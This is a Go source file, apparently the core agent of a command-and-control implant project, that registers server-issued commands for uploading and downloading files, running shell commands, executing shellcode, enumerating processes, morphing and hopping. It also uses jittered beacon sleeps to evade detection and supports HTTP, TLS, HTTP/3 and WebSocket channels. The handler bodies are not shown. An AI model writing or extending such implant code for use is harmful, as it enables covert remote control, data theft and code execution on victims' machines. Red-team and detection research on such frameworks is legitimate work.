package agent

import (
	"fmt"
	"log"
	"math"
	"math/rand"
	"numinon_shadow/internal/agent/comm"
	"numinon_shadow/internal/agent/config"
	"numinon_shadow/internal/models"
	"time"
)

// CommandHandlerFunc defines the signature for functions that handle specific C2 commands.
// It takes the raw task response from the server and a pointer to the agent instance.
// It's responsible for parsing its specific arguments from task.Data and returning a AgentTaskResult.
type CommandHandlerFunc func(agent *Agent, task models.ServerTaskResponse) models.AgentTaskResult

// Agent represents an agent instance
type Agent struct {
	config       config.AgentConfig
	communicator comm.Communicator
	stopChan     chan struct{}
	rng          *rand.Rand

	commandHandlers map[string]CommandHandlerFunc // Maps commands to their keywords
}

func registerCommands(agent *Agent) *Agent {
	agent.commandHandlers["upload_file"] = (*Agent).handleUploadFileTask
	agent.commandHandlers["download_file"] = (*Agent).handleDownloadFileTask
	agent.commandHandlers["run_cmd"] = (*Agent).handleRunCommandTask
	agent.commandHandlers["execute_shellcode"] = (*Agent).handleExecuteShellcodeTask
	agent.commandHandlers["enumerate_processes"] = (*Agent).handleEnumerateProcessesTask
	agent.commandHandlers["morph"] = (*Agent).handleMorphTask
	agent.commandHandlers["hop"] = (*Agent).handleHopTask

	return agent
}

// NewAgent creates and initializes a new Agent instance.
func NewAgent(cfg config.AgentConfig) (*Agent, error) {
	log.Println("|AGENT INIT|-> Creating new agent instance...")

	// communicator, err := comm.NewHttp1ClearCommunicator(cfg)
	communicator, err := comm.NewCommunicator(cfg)
	if err != nil {
		return nil, err
	}

	log.Printf("|AGENT INIT|-> Agent configured for protocol: %s", cfg.Protocol)

	agent := &Agent{
		config:       cfg,
		communicator: communicator,
		stopChan:     make(chan struct{}),
		rng:          rand.New(rand.NewSource(time.Now().UnixNano())),
	}

	agent = registerCommands(agent) // REGISTER ALL OUR COMMANDS

	log.Println("|AGENT INIT|-> Agent instance created successfully.")
	return agent, nil
}

// calculateSleepWithJitter calculates the next sleep duration based on BaseSleep and Jitter.
func (a *Agent) calculateSleepWithJitter() time.Duration {
	delay := float64(a.config.Delay)
	jitter := a.config.Jitter

	// Calculate the jitter amount
	jitterAmount := delay * jitter

	// Generate a random factor between -1.0 and 1.0
	randomFactor := (a.rng.Float64() * 2) - 1

	// Apply the jitter to the delay
	finalSleep := delay + (jitterAmount * randomFactor)

	if finalSleep < 0 {
		return time.Duration(math.Abs(finalSleep))
	}

	return time.Duration(finalSleep)
}

// Start initiates the agent's main operational loop based on the configured protocol.
func (a *Agent) Start() error {
	log.Printf("|AGENT START|-> Starting agent main loop for protocol %s...", a.communicator.Type())

	switch a.communicator.Type() {
	case config.HTTP1Clear, config.HTTP1TLS, config.HTTP2TLS, config.HTTP3:
		log.Println("|AGENT START|-> Entering HTTP-based run loop.")
		return a.runHttpLoop()
	case config.WebsocketClear, config.WebsocketSecure:
		log.Println("|AGENT START|-> Entering WebSocket-based run loop.")
		return a.runWsLoop()
	default:
		log.Printf("|❗ERR AGENT START| Unknown or unsupported communicator type: %s", a.communicator.Type())
		return fmt.Errorf("unknown communicator type: %s", a.communicator.Type())
	}
}

// Stop signals the agent to gracefully shut down.
func (a *Agent) Stop() {
	log.Println("|AGENT STOP|-> Stop requested. Signaling stop channel...")
	// Close the channel to signal all listening goroutines (like runHttpLoop)
	// Use a non-blocking send to avoid blocking if the channel is already closed or not listened to.
	select {
	case <-a.stopChan:
		// Already closed, nothing to do.
	default:
		close(a.stopChan)
	}

	// Allow communicator to clean up
	if err := a.communicator.Disconnect(); err != nil {
		log.Printf("|WARN AGENT STOP| Error during disconnect on stop: %v", err)
	}
	log.Println("|AGENT STOP|-> Stop signal sent.")
}
